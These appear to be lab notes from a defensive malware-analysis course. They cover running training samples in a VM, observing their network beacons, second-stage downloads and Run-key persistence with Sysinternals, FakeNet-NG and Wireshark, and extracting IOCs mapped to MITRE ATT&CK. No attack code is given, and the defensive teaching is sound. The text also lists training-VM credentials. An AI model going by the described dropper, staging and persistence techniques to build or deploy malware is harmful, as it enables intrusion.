NOTE: Usually, the best course of action is to revert a VM to a snapshot and then to run the malware again in another tool. However, because this is custom malware and its actions are already known, the cleanup script is sufficient for this exercise.


Complete the tasks in the following workflow to analyze a malicious file using Procmon and TCPView.


Workflow


1. Open Procmon64. A prompt appears, stating that this file was downloaded from the Internet. Select Run. 


2. A prompt asks for permission to make changes to the device; select Yes. 


3. Drag the Procmon64 window to the side so that the desktop is visible.


4. Run Lab1.exe again from the desktop. Read the pop-up message, and close the window.

<img width="1054" height="320" alt="image" src="https://github.com/user-attachments/assets/26fbf39d-19a4-4f2f-8f63-4a44a2e92b51" />

In Procmon, filter the output so that only Lab1.exe information is displayed. 


5. Select Filter on the menu bar, and select Filter in the resulting menu. In the Process Monitor Filter window that appears, select Process Name in the first drop-down field, enter Lab1.exe as the search term, select Add, and select OK:

<img width="323" height="336" alt="image" src="https://github.com/user-attachments/assets/4ddc9ed5-8931-4824-8c5e-7cd643320a6e" />

<img width="583" height="342" alt="image" src="https://github.com/user-attachments/assets/f45a4fff-5755-425a-adcd-93c74102be88" />



Once the events are filtered to show only a specific process, it is possible to get an idea of what files, connections, or processes the application of interest is accessing.


6. Scroll down the output list, and look for results that show interaction with the registry, file activity, and network connections. Many other filters may also be added to Procmon to clean up the output.  


7. Close Procmon.


8. Open TCPView64 to get a different view on network connections. (Select Yes when prompted to open the application with administrative privileges.)


9. In the TCPView search box, enter Lab1.exe to filter the current network connections of this process:



<img width="1704" height="248" alt="image" src="https://github.com/user-attachments/assets/3bd0dee3-9b96-4295-91bd-474c2ff1e820" />



The output of the tool shows that the application is continuously making connections to a remote address over port 8080. At this time, it is not possible to determine the type of connection or whether there are GET or POST requests with this tool.


10. Close TCPView64. 


11. On the desktop, re-run cleanup.bat as administrator to stop the malware and to clean up its artifacts.


Complete the tasks in the following workflow to analyze a malicious file using FakeNet-NG.


Workflow


1. On the desktop, open FakeNet-NG, which helps collect more information about the network requests. When the prompt to make changes to the device appears, select Yes. 


2. Open Lab1.exe and observe the network results in FakeNet-NG.


Fakenet-NG picks up several requests regarding Lab1.exe:

<img width="1028" height="585" alt="image" src="https://github.com/user-attachments/assets/67007119-ed44-4954-8233-cce8906a6a49" />




3. Close Fakenet-NG, and browse to the fakenet1.4.11 folder (C:\Users\Public\Public Downloads\Tools\fakenet1.4.11). Open the file packets_[currentdate] in Wireshark by double-clicking the file:


<img width="850" height="436" alt="image" src="https://github.com/user-attachments/assets/c9423492-6d7e-400f-8502-cb095380e5d7" />


4. In Wireshark, set the display filter to tcp.port == 8080. This port was seen in FakeNet-NG, but Wireshark provides more details.

<img width="1398" height="382" alt="image" src="https://github.com/user-attachments/assets/db77fd00-b653-4e40-90f8-157a1f6c22c3" />


5. Set the display filter to http.request.method == GET to see only the GET requests:


<img width="829" height="631" alt="image" src="https://github.com/user-attachments/assets/e57037b7-8069-42c1-825f-8b04cfde3f87" />


6. Close Wireshark, and run Autorunsc64.exe from the Desktop within a command prompt. Carefully scroll through the results to see driverupd.exe was added to the Run key. 


There is an issue with Autoruns64.exe that it will not display the recent registry change even after reboot, but Autoruns64.exe (command line) does detect the change.


Autoruns is quite effective in finding persistence objects in conjunction with Procmon.

<img width="687" height="313" alt="image" src="https://github.com/user-attachments/assets/bd675024-799f-4908-acb5-b4c821515b2b" />

7. Close Autoruns, and run cleanup.bat as administrator. 


Use this lab to answer the following questions

<img width="1127" height="593" alt="image" src="https://github.com/user-attachments/assets/6318aee9-ebdb-4e44-b7af-8e98f6a5b688" />

<img width="1116" height="550" alt="image" src="https://github.com/user-attachments/assets/08e7d87e-c490-4061-afcc-aaac59a20a07" />


-------------

Malware Analysis for IOCs
IOCs are clues or artifacts that indicate that a system may have been infiltrated by a cyber threat and how extensive the damage may be. IOCs provide cybersecurity teams with vital data after a security breach. 

﻿

Security teams benefit when analysts gather multiple IOCs and use them to evaluate the details of a possible attack. This information can be used to determine what type of attack took place and, in some cases, who was behind it. It is also beneficial for security teams to document any IOCs to prevent attacks in the future. 

﻿

Common IOCs
﻿

Several types of IOCs exist; some include simple elements, such as metadata, and others are more complex, such as complicated malicious code. Descriptions of the most common IOCs are as follows.

﻿

Unusual Outbound Network Traffic
﻿

Traffic leaving the network is an indicator that analysts can use to identify a potential issue. To steal data or download any additional packages, malware needs to connect with an external host from the compromised system. If outbound traffic patterns are suspicious, such as abnormal connection or data transfer volumes, an analyst can monitor them to determine if the traffic is malicious or not. Traffic that originates from within the network is easier to monitor, and immediate action can stop an attack.

﻿

Other activities that should be monitored are hexadecimal IP addresses (for example, http://0x60D00297) instead of a typical domain name with the format domain.com. Outbound packages should also be monitored for any IP spoofing and cross-referenced with any suspicious IP directories to determine if specific IPs or domains are legitimate.   

﻿

Anomalies in Privileged User Account Activity
﻿

Privileged user accounts typically have access to sensitive areas within a network or applications. If any anomalies are discovered early in an attack, security teams can identify an attack before it causes significant damage. Anomalies to look for are users trying to escalate account privileges without proper approval, users using an account to access other accounts with higher privileges, or users accessing data or applications that are abnormal for that account.

﻿

Geographic Irregularities
﻿

Login attempts from countries with which the organization does not do business can be a sign of a potential cyber attack. This is usually evidence that an attacker from another country is trying to get into a system or already has accessed it. 

﻿

Account Login Irregularities
﻿

Legitimate users are typically successful at logging in to account within three attempts. Attempts to log in many times or at an unusual time of day are signs that an attacker may be trying to access the system. Failed login attempts for nonexistent accounts are evidence that an attacker may be attempting to guess the login credentials for a system to obtain access to that system.

﻿

Surge of Database Read Volume
﻿

An attacker’s attempt to exfiltrate data can result in a large increase in the read volume for data in a database. This can occur as the attacker gathers the data in an attempt to extract it.

﻿

Hypertext Markup Language Response Sizes
﻿

If the typical Hypertext Markup Language (HTML) response size is relatively small for an organization but larger-than-usual HTTP responses (the data coming back from the server being requested) are occurring, this is an indicator that data has been exfiltrated. For example, requesting the web page Google.com results in a server response that provides the web page, which is relatively small in size. If malware makes a web request to download a file, the response is likely significantly larger in size than a basic web page request. Typically, C2 servers also request frequent check-ins with the infected machine and are all the same size in each request. This can help identify malicious behavior and could be used to create a signature to detect malicious activity in the future. A mass exodus of data results in large HTML response sizes as the data is transmitted to the attacker.

﻿

Large Number of Requests for the Same File
﻿

Attackers often try to access specific files that they are attempting to steal. If specific files are requested multiple times by the same person or by an unusual account, this may indicate that an attacker is attempting to access that file. 

﻿

Unusual Network and File SystemTraffic
﻿

Suspicious or unfamiliar new network or file system objects can be clear IOCs. Common file extensions that attackers use with malware include .exe, .dll, and .bat. However, any type of executable, library, or configuration file can be used by attackers for malware to impersonate a legitimate file.

﻿

Applications often use ports to exchange data with a network. Attackers can use unusual ports to penetrate the network through an application or to affect a specific application. They also use C2 servers to compromise a network with malware. The server sends a command to execute malware, steal data, or interrupt services. An anomalous DNS request, particularly if it comes from a certain host, is an IOC. 

﻿

Establishing a network or file system baseline can make such changes easier to spot by an analyst.    

﻿

Summary of IOCs 
﻿

The following summarizes the IOCs to look for when gauging whether a suspicious activity has occurred:

Unusual traffic patterns between internal systems.
Unusual usage patterns for privileged accounts.
Administrative access to a network from an irregular geographic location.
Suspicious IP addresses or hostnames.
URLs or domain names of botnets.
Known MD5 hashes of malicious files.
Virus signatures of known malware.
Windows registry entries that are unfamiliar.
Unfamiliar network processes or services. 
Unauthorized configuration changes to files, servers, or systems.
Common Tactics, Techniques, and Procedures Associated with Malware
﻿

Most modern malware uses a combination of Tactics, Techniques, and Procedures (TTPs) to hide its operations, stage exploits, evade detection, and leverage network weaknesses. Using the MITRE ATT&CK® framework, analysts can map some of the common IOCs to specific TTPs to further analyze potential malware on a system and the goals an attacker may want to achieve when targeting an organization. 

﻿

Execution (TA002)
﻿

The Execution tactic consists of techniques that result in attacker-controlled malware running on a local or remote system. These techniques are often paired with techniques from other tactics to create a sophisticated attack and achieve the attacker’s goals, whether that is stealing data or performing reconnaissance on a network. An example of a common malware technique that attackers use for Execution is as follows:   

﻿

User Execution of a Malicious File, Subtechnique T1204.002﻿

﻿

An adversary relies on a user to execute a malicious program via a file that was sent to or downloaded by the victim. The file format is often .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, or .cpl, and the file may be named in a way to garner the attention of the victim.

﻿

Detection of Execution TTPs﻿

﻿

An analyst can see which files were recently accessed through Sysmon and which processes were responsible for starting them. This provides the analyst an understanding of the execution flow of that specific piece of malware. Any attachments recently opened from an email and files opened using their usual default program but spawning an executable can be used as IOCs to track this activity.

﻿

Persistence (TA0003)
﻿

With the Persistence tactic, an attacker attempts to maintain their foothold on a target to continue their presence in a system or network. This tactic consists of techniques to keep the attacker present on systems across restarts, changed user credentials, and other interruptions that could cut off their access to the system. Techniques for this tactic include such methods as replacing or hijacking legitimate code with attacker-controlled code or by adding code to the startup of a system. Two examples of techniques that attackers use to achieve persistence are as follows: 

﻿

Registry Run Keys/Startup Folder, Subtechnique T1547.001﻿

﻿

Malware can create registry keys in the HKLM\Software\Microsoft\Windows\CurrentVersion\Run area of the registry or add files to the C:\Users\[username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup directory for persistence. 

﻿

Create Local Account, Subtechnique T1136.001﻿

﻿

Malware may be programmed to create new user accounts that have administrative privileges enabling an attacker to access the system under that new account. Newly created accounts may not always be created with administrative privileges, however, because new accounts with administrative privileges are easier for analysts to spot. Creative attackers use low-level accounts and then implement privilege escalation techniques. 

﻿

Detection of Persistence TTPs﻿

﻿

To detect persistence on a Windows system, analysts should check native Windows logs and Sysmon events to find new scheduled tasks or recently created services. Hunting in persistence locations for anomalies and outliers is a great way to find an attacker. Specifically, the name of the malicious binary and the name of the key added to the registry can be used as IOCs to search other hosts for this activity. Using Autoruns to detect programs that attackers are using during startup is also a good way to detect persistence methods that attackers are using. 

﻿

Defense Evasion (TA0005)
﻿

Defense Evasion consists of an attacker’s attempt to avoid detection. Defense Evasion techniques include uninstalling or disabling security software, such as an antivirus solution, or obfuscating or encrypting data and scripts. Attackers also leverage and abuse trusted system processes to hide malware. They also combine other tactics, to include the added benefit of evading defenses when creating malware.  

﻿

Disable or Modify Tools, Subtechnique T1562.001﻿

﻿

Attackers may modify or disable antivirus software or other Endpoint Detection and Response (EDR) agents running on the system.

﻿

Disable Windows Event Logging, Subtechnique T1562.002﻿

﻿

Attackers may turn off the Windows Event Logs so that defenders do not have logs to investigate to uncover the actions taken on a host.

﻿

Detection of Defense Evasion TTPs﻿

﻿

The Windows Event Logs, specifically the System Log , contains  information about running services. If an attacker could disable the Event Log service or stop Windows Defender, there would still be a log for these events. Event Identifier (ID) 1102 is the ID to look for when the Security Log is cleared, and event ID 7036 shows when services are stopped. Event ID 104 in the System Log appears if the System or Application Logs are cleared. Also, tools like Sysmon should be able to see the command-line arguments used by a malicious program that can be used as IOCs to track this activity.



--------------


Investigate a System for IOCs
Read the following scenario: 

﻿

An analyst needed a newer version of an antivirus program to scan hosts in the network. Funding was not available for the program of choice, and the analyst downloaded what appeared to be an unlocked version of the desired antivirus program from the product website: 


<img width="1168" height="440" alt="image" src="https://github.com/user-attachments/assets/3da6cdfb-dc2e-4ead-a0ce-dac64d3136a8" />

In the following lab, using the skills and knowledge gained in this lesson, investigate the host machine for malware. The goal of the lab is to discover multiple IOCs. In a real scenario, these collected IOCs would be used to quickly search an environment to determine if other hosts were affected.


Items of interest include the following:

Hash of the downloaded file and the file created by the malware. Used to quickly find other hosts or to block that file from running in the environment, depending on what EDR tools are available.
Persistence used. Used to find other hosts if the hashes have been changed.
Network activity. Used to block that IP and port or identify hosts communicating with that IP to indicate they are also compromised.

Any of the following tools that were covered in the first lab of this lesson may be used:
Sysmon (event IDs 1, 11, 13, and 15)
Regshot
Sysinternals tools (Procmon, TCPView, Autoruns)
FakeNet-NG/Wireshark (http.request.method == GET OR tcp.port == 8080)

Workflow


1. Log in to the VM win-hunt using the following credentials: 
Username: trainee
Password: CyberTraining1!



2. To analyze Sysmon events, open Chrome and select the Discover - Elastic bookmark.


3. When the warning Your connection is not private appears, select Advanced, and select Proceed to 199.63.64.92 (unsafe). 


4. Log in to Elastic using the following credentials:

Username: trainee@jdmss.lan
Password: CyberTraining1!



5. Set the Kibana filter dates as Aug 2, 2022 @ 09:23:15.000 to Aug 2, 2022 @ 09:25:00.000.


6. Set the search filter to view a single host and to remove noisy logs that are not important for this investigation, as follows:
agent.name:"bp-wkstn-1" and not (message:"*find.exe" or message:"*NETSTAT.exe")


7. Once malicious files are located, one method to obtain the hash is to right-click on the file and select Md5 Hash:


<img width="329" height="188" alt="image" src="https://github.com/user-attachments/assets/2a31abad-c71a-4096-b801-4bf2e9ff07d2" />

After the malicious files are located, answer the following questions

<img width="1091" height="602" alt="image" src="https://github.com/user-attachments/assets/39e1b6cb-666f-48b2-bed7-fd3b926b16d1" />

<img width="1111" height="623" alt="image" src="https://github.com/user-attachments/assets/140fa9ec-bf7f-41b3-8fe3-3003b7385739" />
<img width="1076" height="658" alt="image" src="https://github.com/user-attachments/assets/c63c9fe4-2f5d-43c2-b7c6-31b98eb131bf" />


-----------------

Explanation
﻿﻿Once Lab1.exe is started, the answer to the prior question may be found directly by using TCPView or Process Monitor.

﻿

In TCPView, sort the output by Process Name. This shows results similar to Figure 23.2-14:


<img width="902" height="152" alt="image" src="https://github.com/user-attachments/assets/0d1db150-106e-4c45-a6ce-f14605767254" />


In Process Monitor, create a Process Monitor Filter, as illustrated in Figure 23.2-15. 
The filter should use Process Name, contains, and Lab1.
Select Add to add the filter.
Select Apply to close the window.


<img width="587" height="356" alt="image" src="https://github.com/user-attachments/assets/fb303140-a5c8-45b7-8bf3-ac819ed5813f" />

Once the filter is applied, the output displays information similar to Figure 23.2-16:

<img width="613" height="136" alt="image" src="https://github.com/user-attachments/assets/31382198-bb65-466b-9ea6-62d42596fd1e" />

The full computer name is cda-win-hunt, the local IP address is 199.63.64.31, and the port number used by Lab1.exe is 8080. 


--------------------

### CDAH-M23L3-Droppers, Stagers, and Loaders ###


Identifying Malware Behavior
Malware on a system exhibits specific behaviors that qualifies it as malware. While some malware behave in obviously malicious ways, other malware behave identical to regular files and services to avoid detection. Analysts may identify malware behavior by investigating three types of activities:

Network

File

Registry

Analysts commonly run the binary and collect information about malware behavior as part of their analysis. Key findings from the analysis may include network signatures, manipulated files, and folders, and spawned processes. 

﻿

Network Activity
﻿

One way to determine malware behavior is to examine the network activity when the malware is run. Malware often open command sockets, download staged shellcode, spawn command and control channels, and leave other networking artifacts behind that can be detected with networking tools. 

﻿

Malware may also attempt to perform unauthorized scans on a network to find any open ports or vulnerabilities that have not been properly patched. Malware can also perform web requests, although they do not always use the standard ports 80 and 443. Instead, Malware may use port 8080 for web requests. 

﻿

When an exploited browser, service, or host downloads malware, this malware is known as a dropper. A dropper is a type of malicious software specifically designed to deliver and install additional malware onto a target system. The primary purpose of a dropper is to facilitate the deployment of other malicious payloads, such as viruses, worms, trojans, ransomware, or other types of malware. Typically, attackers fetch a dropper from a website that is completely separate from the original exploit. Using a separate source helps attackers hide the original exploit source. The browser or host then unpacks and executes the binary to load the attacker's full malware toolkit. The malware can then communicate with the command and control (C2) host. 

﻿

Analysts should be attentive to any downloads from unfamiliar websites and any new network connections that are sent or received from untrusted hosts. These behaviors may indicate that malicious code was downloaded, if attackers successfully communicate with anomalous Internet Protocol (IP) addresses.

﻿

When analyzing malware that is running on a system it is imperative to identify any IP addresses that the malware is using, whether or not they are local. Any IP addresses that the malware is using locally could signify that the malware is talking to other malicious files already present on the network. If malware is calling out to external IP addresses or ports those could be part of the attacker's C2 channel. 

﻿

Another way to identify malware that is communicating with an attacker's command and control is to watch for any known malicious User-Agent strings in Hypertext Transfer Protocol (HTTP) requests. User-Agent strings are added to most HTTP queries and are designed to uniquely identify the software generating the query. Analysts should monitor for any suspicious or known User-Agent strings and any web requests from the malware they're analyzing. 

﻿

File Activity
﻿

Attackers often use malicious files as a threat vector to deliver malware. An attacker may rely on users opening a malicious file to execute the malware on a system. Attackers typically use phishing methods such as spam emails, or text messages to deliver malicious files. Adversaries may use several different types of files such as the following:

.doc

.pdf

.xls

.rtf

.exe

.lnk

Attackers may also place a file in shared directories with the expectation that users will execute them. 

﻿

A prime indicator of malware is when files are downloaded or constructed shortly before being executed. Analysts may monitor for file and process creation events to capture this indicator. Files may also be accessed or deleted, depending on the goal of the attacker. Attackers often try to access files that require privileged access, so analysts should monitor accounts that have privileged access for any unusual behavior, such as accessing files that they normally do not. 

﻿

Malware Delivery Types 
﻿

Three types of malware delivery methods as titled in this lesson are as follows: 

﻿

Dropper 

﻿

A dropper is typically an executable or a Dynamic Link Library (DLL) that has an additional executable embedded within it. During the execution of the file, it "drops," or extracts, the secondary file to disk for execution. 

﻿

Stager 

﻿

A stager is a small file (a few kilobytes [KB]) that contains only instructions to download a malicious file that is much larger (potentially megabytes [MB]) in size. A stager runs in the background downloading malware and is stealthier than watching a progress bar for a download in a browser or seeing a large attachment on an email. Some email clients filter out large attachments, and using a stager may ensure that the initial malware file can be delivered to the victim. 

﻿

Loader/Downloader 

﻿

A loader, also known as a downloader, is given to the method of delivery for a type of malware. An example is malicious JavaScript (JS) that runs on a website that causes the browser to download the first stage of the malware. The JS itself is a “loader/downloader” because it loads the malware onto the host.﻿

﻿

Registry Activity
﻿

Malware often modifies entries in the Windows registry to achieve persistence and remain hidden from detection on a system. Analysts should pay attention to some of the common areas that malware modifies. Common registry keys that malware may attempt to hide in include the following:

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\explorer\User Shell Folders

When analyzing these registry keys, analysts should look out for any misspelled names of software or files, and any unfamiliar programs. Some malware may also fill the registry with unwanted files or orphaned applications to slow down the operating speed of the system. 

﻿

Malware may also manipulate the registry to run malicious files whenever the system is restarted. These types of malware may use tools similar to autoruns, which identify all programs set to execute when a system is booting up. Autoruns can also be used to analyze file hashes for any files that may be malicious.

﻿-------------

 Analyzing Network and Host Activity
﻿
﻿

A malicious file on the desktop of the workstation win-hunt is available for analysis. Examine the network characteristics that can be discovered and used as IOCs to track and block this activity.

﻿

Workflow
﻿

1. Log in to the Virtual Machine (VM) win-hunt using the following credentials: 

Username: trainee
Password: CyberTraining1!
﻿

2. Start Wireshark and select yes when prompted by User Account Control (UAC) to make changes to the device.

﻿

3. Begin collecting network activity by double-clicking Ethernet0 under the filter search bar.

﻿

4. Set a display filter to only display web activity by entering the following in the display filter search box:

http.request.method == GET
﻿

5. Minimize Wireshark so that the desktop is visible. 

﻿

6. On the desktop, right-click on the file dropper.exe, select Run as administrator, then select Yes when prompted by UAC to make changes to the system.

﻿

Executing dropper.exe displays a warning in a dialog box named Dynamic Malware Analysis Lab. 

﻿

7. Select OK on the Malware Analysis Lab popup.

﻿

8. Exit the command prompt window by selecting the X in the top right corner. 

﻿

9. View the information WireShark collected by maximizing the Wireshark window.

﻿

Figure 23.3-1, below, displays that the client 10.10.64.31 made an HTTP connection over port 80 with a GET request for /2ndstage.exe from the IP 10.10.64.51. The client shortly thereafter made connections to the same IP over port 8080 with GET requests for /callback.

﻿
<img width="1083" height="232" alt="image" src="https://github.com/user-attachments/assets/64a5d50d-d6e4-4407-9056-6797176ed983" />


Wireshark provides more information about each request, when they are selected individually.


10. Select the line that displays 2ndstage.exe in the column Info. 


11. In the pane below the list of requests, display the domain that was used for the request selected and its User-Agent by expanding the line Hypertext Transfer Protocol, as displayed in Figure 23.3-2, below:

<img width="1303" height="403" alt="image" src="https://github.com/user-attachments/assets/94c88f72-aa3b-4aa1-b053-12712adc3785" />


Analysts may use both the domain 1drive.com and User-Agent information python-requests/2.28.1 as IOCs, in conjunction with the port and specific GET requests to identify this unique behavior from this particular piece of malware.


12. View the contents of any /callback request by selecting its entry from the list of requests in the top pane.


13. Exit Wireshark and select Stop and Quit without saving.


Before continuing onto the next lab, the workstation needs to be cleared. The system provides the tool cleanup.bat for this lab to clean the environment and stop the malware from running.


14. On the desktop, right-click cleanup.bat, select Run as administrator, and select Yes to make changes.


Analyze Network Traffic and Host Activity with Procmon


Continue working in win-hunt. Examine the malicious file using Procmon filters.


Workflow


1. From the desktop of the VM win-hunt, select Procmon64.exe.


2. Select Run when prompted and Yes to make changes.


Procmon begins collecting data immediately after it opens. Setting filters makes it easier to view artifacts without getting lost in the many lines of output generated by this tool.


3. Select Filter from the toolbar at the top of the window.


4. Select Filter from the drop down menu.


5. In the window Process Monitor Filter, select the first drop-down menu and change it to Process Name, as displayed in Figure 23.3-3, below:

<img width="582" height="135" alt="image" src="https://github.com/user-attachments/assets/ce6f0540-88ef-44c0-b9b5-cb3b7916ad0e" />


6. In the third field, highlighted below in Figure 23.3-4, enter the filename dropper.exe:

<img width="582" height="135" alt="image" src="https://github.com/user-attachments/assets/f61efdcf-2b8f-4577-b3cb-648ab5b8ecb4" />

7. Add the filter by selecting Add.


8. Replace dropper.exe in the third field from step 6 with 2ndstage.exe, then select Add.


9. Change the field value of the first field, highlighted in step 5, by selecting Operation from the drop-down menu. 


10. Change the field value of the second field, highlighted below in Figure 23.3-5, by selecting contains from the drop-down menu



<img width="582" height="135" alt="image" src="https://github.com/user-attachments/assets/cff597f9-bb9a-41cb-aadd-cff6bebe6fde" />

11. Replace 2ndstage.exe in the third field with TCP, then se
lect Add.


The first three items listed in Figure 23.3-6, below, are the new filters that were added after correctly completing steps 5-11


<img width="844" height="364" alt="image" src="https://github.com/user-attachments/assets/7ba1cf5c-41ad-4d50-beb0-6346d408c1f6" />


12. At the bottom of the window, select OK.


13. Minimize Procmon to view the desktop. 


14. Execute dropper.exe by right-clicking on the file, selecting Run as administrator, then selecting Yes when prompted to make changes.


15. Exit the popup windows by selecting OK, then the X, at the top right of the window.


16. Maximize Procmon and begin examining the events. 


Procmon now displays the domain that is being accessed, 1drive.com, and the type of Transmission Control Protocol (TCP) event.


17. View more details about 2ndstage.exe by scrolling to the bottom of the window and double-clicking on the first item that lists 2ndstage.exe as its Process Name. 


This displays a new window with the tabs Event, Process, and Stack. These tabs provide additional information about the process and what files it relies on.


18. Exit Procmon to view the desktop.


19. Prepare this host for the later labs by running the script cleanup.bat as administrator.

<img width="1115" height="560" alt="image" src="https://github.com/user-attachments/assets/25475b53-deb2-4516-8ffc-be3024d8ffae" />

-----------

Extracting IOCs for Intelligence
Malicious files leave a trove of evidence that can be used to understand their behavior and identify them on other systems. This section covers a few of the areas IOCs can be found and how they can be used to detect, thwart or understand malicious activity on a system or network. These areas include the following:

File hashes
Strings
Uniform resource locators (URL)
IP addresses
Created files
File Hashes
﻿

A file hash is a unique identifier associated with a file. File hashes are effective as IOCs. Message-Digest Algorithm 5 (MD5), Secure Hash Algorithm 1 (SHA1), and SHA256 are three main hash formats that are used to determine the unique signature of a file. These hashes can be loaded into an Endpoint Detection and Response (EDR) tool or through a Powershell script in a live environment to scan a system for any files present that match these signatures.

﻿

Strings
﻿

Strings are lines of information that are stored within the malicious binary. Sometimes there are unique items or a combination of items that together can be used to identify this file. The ability to extract strings from a binary depends on a variety of factors such as whether the file was packed or heavily obfuscated and the specific compiler used. Typically, rules for the tool Yet Another Recursive Acronym (YARA) are used to scan through a malicious binary’s strings to quickly identify if it is malicious rather than only examining a hash. This is because file hashes can change with each release of a malicious binary. 

﻿

URLs
﻿

When a host becomes compromised, there is typically some sort of web request that takes place before and after the compromise. Some URLs look very strange and are easy to spot such as ones that use domain generation algorithms that automatically combine multiple letters and numbers together and then rotate every couple of days. URLs may still be malware, even if they are displayed as normal URLs. Many times a domain will be made to look like a legitimate domain, but with small changes. Examples of these changes include domains with spelling that is slightly off or replacing a digit one with the letter l to appear similar to a legitimate domain.

﻿

The GET and POST requests from HTTP traffic may also be unique, when paired with the domain, depending on the type of malware and its properties. Some malware make their requests standard such as /health to blend in with other legitimate traffic. Occasionally requests are very long and unique to the victim. Either way, once a suspicious URL and the domain are discovered, this can be used as an IOC to search through an enterprise and determine whether other hosts are making similar requests.

﻿

IP Addresses
﻿

Malicious actors can use an IP address instead of a domain name to avoid having to register that domain. It doesn’t take much effort for an actor to take a server they already have access to and turn it into a web server from which they can easily upload or download files. Analysts should be suspicious any time a host  communicates directly with an IP address instead of a domain name. Analysts can block these IPs, log them at the proxy, and alert the security team when a host is contacting that IP address.

﻿

Created Files
﻿

Most malware uses a stager and the first file that lands on the host is not the program that does all the malicious behavior. Typically, the first file is small and lays the foundation for the second stage to be downloaded and executed. That second stage is likely the one that is downloading additional tools, malware, or other malicious artifacts. The second stage may set up persistence on the host. If the analyst knows what the first file or dropper is, and it is possible to see the chain of events, it becomes much easier to identify all the files that the second, third, and fourth malicious files have placed onto the system. Once an investigation has been performed on a host that has malware installed, an EDR tool such as Splunk can be used to search for those filenames across the network to find other hosts exhibiting similar behavior.

---------------

Identify Malware Characteristics
Analyze the malicious binaries from the first lab to determine whether there are any IOCs available. Analyze the files statically with command line tools. The binaries have been modified slightly to provide more information than what the initial compilation of the binaries provided.

﻿

Workflow
﻿

1. Log in to the VM win-hunt using the following credentials: 

Username: trainee
Password: CyberTraining1!
﻿

2. On the desktop, open Powershell. 

﻿

3. Change directory to where the malware files are located by entering the following:

cd C:\Users\Trainee\Desktop\Lab2
﻿

The current folder stores both malware files.

﻿

4. Begin to obtain the hashes of the files by executing the following command:

Get-FileHash .\dropper.exe
﻿

By default, Powershell provides the SHA256 hash of the file. To change the format of the hash, specify the parameter -Alg or -Algorithm with either MD5 or SHA1.

﻿

5. View all strings in a file by entering the commandlet Get-Content .\dropper.exe. 

﻿

Step 5 creates many lines of data that become difficult to read. A better option is to use terms that may be in the file to pinpoint the most relevant results. For example, the file may include the term HTTP if there are web requests. 

﻿

6. View the URL that was used to download 2ndstage.exe by running the following command:

Get-Content .\dropper.exe |Select-String "http"
﻿

Another way to display a cleaner output of strings is to use the utility SysInternals strings64. 

﻿

7. In Powershell, change directories to where strings64 is present by entering the following:

cd C:\Users\Public\Downloads\Tools\SysinternalsSuite
﻿

8. Run strings64 against dropper.exe with select-string filtering on HTTP by entering the following:

.\strings64 C:\Users\trainee\Desktop\Lab2\dropper.exe|Select-String "http" 
﻿

Figure 23.3-7, below, displays the output from step 8. Running strings64 in step 8 provides a cleaner output than running Get-Content in step 6:

﻿<img width="1581" height="161" alt="image" src="https://github.com/user-attachments/assets/59c90169-c62b-4db1-8ca6-2f3197ffbebc" />

9. Use PowerShell to check whether /callback is present in the file by running the following command:
Get-Content C:\Users\trainee\Desktop\Lab2\2ndstage.exe |Select-String "/callback"



Part of the request checks whether /callback is present in the file. This request for the callback relates to item T1071.001 in the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®), under Command and Control. T1071.001 illustrates an attacker setting a web request to blend in with the environment to prevent the request from attracting suspicion by defenders. The request enables threat actors to communicate with the compromised host. The request is generally less obvious than it is in this lab.


Sysinternals is also capable of checking for /callback with the following command:
.\strings64 C:\Users\trainee\Desktop\Lab2\2ndstage.exe|Select-String “/callback” 



10. Find out the other activities the tools executed by running the following and searching for any command line activity:
Get-Content C:\Users\trainee\Desktop\Lab2\2ndstage.exe|Select-String '.exe'



In Sysinternals, the following command displays the same results as step 10:
.\strings64.exe C:\users\trainee\Desktop\Lab2\2ndstage.exe|Select-String ".exe"



Executing the command in step 11 clarifies that persistence was achieved through the registry in the same manner as MITRE ATT&CK T1547.001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder. This investigation also revealed another file, driverupd.exe, which was created on the host. This additional file requires additional investigation.

<img width="970" height="524" alt="image" src="https://github.com/user-attachments/assets/991f3704-d889-4d52-add3-7f6c89dd65d0" />


-----------------


Extracting Attributes for Reporting
When building an intelligence report, it is important to provide as much information as possible to create a clear picture of the adversary. More information also helps illustrate the malicious attack that a team may be facing. The intelligence report may include elements such as the following:

Threat indicators
Timelines of the attack
Command line options that the attackers used
Parent-child process relationships that were compromised
Putting all of this information together in a report allows analysts to determine what type of malware or attack they are facing, and even potentially what attacker is targeting them. 

﻿

Threat Indicators
﻿

Threat indicators are data that associate artifacts such as URLs, file hashes, or IP addresses with known threat activity such as phishing or malware. This form of threat intelligence is often known as tactical threat intelligence because it can be applied to security tools and automation to detect a potential threat to an organization. 

﻿

When building a report, include threat indicators to provide a clear view of the techniques attackers are using. This includes any techniques used to compromise the system, maintain persistence, conduct lateral movement, and continue exploiting the system.

﻿

Timelines
﻿

Including the timeline of events in a report provides a complete picture of the sequence of activities in the incident. Establishing a timeline from the start of the attack to the discovery of the attack is helpful for the analyst to investigate the attack. With a timeline, analysts are better equipped to detect any malware that may have been dropped or staged on the system within that time frame.

﻿

Command Line Options
﻿

Reports should also include any command line options that the attackers used because this helps determine which adversary may be behind the attack. Most adversaries have Tactics, Techniques, and Procedures (TTP) that they regularly use, including command line options they designate for an attack. This also helps analysts determine the extent of the attack and how deep they should go when searching for other systems or networks that were compromised. 

﻿

Parent-Child Process Relationships
﻿

Adversaries typically exploit processes with which they are familiar, similar to how they handle command line options. This is why reports that include the processes that adversaries exploited are also helpful for determining who is behind the attack. Analysts can use this information to evaluate the other systems or applications that may be infected with malware from a child or parent process that they are using.


-----------------


Extract Attributes for Reporting
